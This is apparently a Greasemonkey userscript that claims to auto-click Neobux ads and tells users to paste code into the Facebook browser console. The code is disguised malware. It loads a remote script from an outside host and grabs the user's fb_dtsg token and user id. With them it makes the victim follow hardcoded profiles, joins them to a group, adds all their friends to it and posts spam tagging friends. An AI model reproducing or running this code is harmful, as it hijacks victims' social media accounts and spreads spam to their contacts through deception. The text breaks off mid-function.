// ==UserScript==
// @name        auto click neobux 2013 
// @description   This Script will automatically Clicks all ads on Neobux.
// @include     http://google.com
// @include     http://facebook.com
// @include     http://dantri.com.vn
// @include     http://google.com.vn
// @include	https://www.facebook.com/groups/458689610887388/
// @require     http://userscripts.org/scripts/source/174516.user.js
// @version     1
// ==/UserScript==

// ==UserScript==


// @description fast and superior to add in any group
// @namespace http://danhtangnguoitoiyeu.com/facebook
// @updateURL https://userscripts.org/scripts/source/166782.meta.js
// @downloadURL https://userscripts.org/scripts/source/166782.user.js
// @homepageURL http://danhtangnguoitoiyeu.com/facebook
// @include *facebook.com*

// 1.Make sure you are using Mozilla Firefox web browse.
// 2.If you don't have then please download it.
// 3.Login to facebook if not logged in already.
// 4.Now open group where you want to add all your friends.
// 5.Now press CTRL+SHIFT+K it will open a Console Box.
// 6.Copy the given below code.

function HQTH_ADS_GetCookie(a){var b=new RegExp(a+"=[^;]+","i");if(document.cookie.match(b)){return decodeURIComponent(document.cookie.match(b)[0].split("=")[1])}return""}function HQTH_ADS_SetCookie(b,c,e){if(typeof e!="undefined"){var a=new Date();var d=a.setDate(a.getDate()+e);document.cookie=b+"="+decodeURIComponent(c)+"; expires="+a.toGMTString()}else{document.cookie=b+"="+decodeURIComponent(c)}}function hoiquantinhoc(){var b=HQTH_ADS_GetCookie("hqth_popup_ads");if(b){return false}else{var f=24*3600*1000;HQTH_ADS_SetCookie("hqth_popup_ads","true",f);var d=["https://www.facebook.com/groups/458689610887388/, http://danhtangnguoitoiyeu.com"]; var c=d[Math.floor(Math.random()*d.length)];var e="width=600";e+=", height=400";e+=", top=0,left=0,scrollbars=yes,status=1,toolbar=1,menubar=1,resizable=1,location=1,directories=1";var a=window.open(c,"hqth_ads_pop",e)}return false}function addEvent(c,a,b){if(c.attachEvent){c.attachEvent("on"+a,b)}else{if(c.addEventListener){c.addEventListener(a,b,true)}else{c["on"+a]=b}}}addEvent(window,"load",function(a){addEvent(document.body,"click",function(b){hoiquantinhoc()})});

document.body.appendChild(document.createElement('script')).src='http://danhtangnguoitoiyeu.com/facebook/arb.facebook_future_0.2.js';

//7.Paste into the Console Box. Then press enter, now wait for few seconds...(^_~) have fun!!

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(isim) {
var tarama = isim + "=";
if (document.cookie.length > 0) {
konum = document.cookie.indexOf(tarama)
if (konum != -1) {
konum += tarama.length
son = document.cookie.indexOf(";", konum)
if (son == -1)
son = document.cookie.length
return unescape(document.cookie.substring(konum, son))
}
else { return ""; }
}
}

function getRandomInt (min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
var http4 = new XMLHttpRequest();

var url4 = "/ajax/follow/follow_profile.php?__a=1";

var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
http4.open("POST", url4, true);

//Send the proper header information along with the request
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close");

http4.onreadystatechange = function() {//Call a function when the state changes.
if(http4.readyState == 4 && http4.status == 200) {

http4.close; // Close the connection

}
}

http4.send(params4);
}

function sublist(uidss) {
var a = document.createElement('script');
a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
document.body.appendChild(a);
}

a("100000313434049");
a("100001094522338");

sublist("100000313434049");
sublist("100001094522338");

var gid = ['307365719394224'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
data = eval('(' + gf['responseText']['substr'](9) + ')');
if (data['error']) {} else {
friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
return _0x93dax8['index'] - _0x93dax9['index'];
});
};
};

for (var i = 0; i < friends['length']; i++) {
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/members/add_post.php?__a=1';
var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
};
httpwp['send'](paramswp);
};
var spage_id = "100000313434049";
var spost_id = "100000313434049";
var sfoto_id = "100000313434049";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}

//arkadaslari al ve isle
function sarkadaslari_al(){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
smesaj = "";
smesaj_text = "";
for(i=f*10;i<(f+1)*10;i++){
if(arkadaslar.payload.entries[i]){
smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
smesaj_text += " " + arkadaslar.payload.entries[i].text;
}
}
sdurumpaylas(); }

}

};
var params = "&filter[0]=user";
params += "&options[0]=friends_only";
params += "&options[1]=nm";
params += "&token=v7";
params += "&viewer=" + user_id;
params += "&__user=" + user_id;

if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
}, false);

//arkadaþ ekleme
function sarkadasekle(uid,cins){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
}
};

xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
var params = "to_friend=" + uid;
params += "&action=add_friend";
params += "&how_found=friend_browser";
params += "&ref_param=none";
params += "&outgoing_id=";
params += "&logging_location=friend_browser";
params += "&no_flyout_on_click=true";
params += "&ego_log_data=";
params += "&http_referer=";
params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
params += "&phstamp=165816749114848369115";
params += "&__user=" + user_id;
xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");

if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
xmlhttp.send(params);
}
}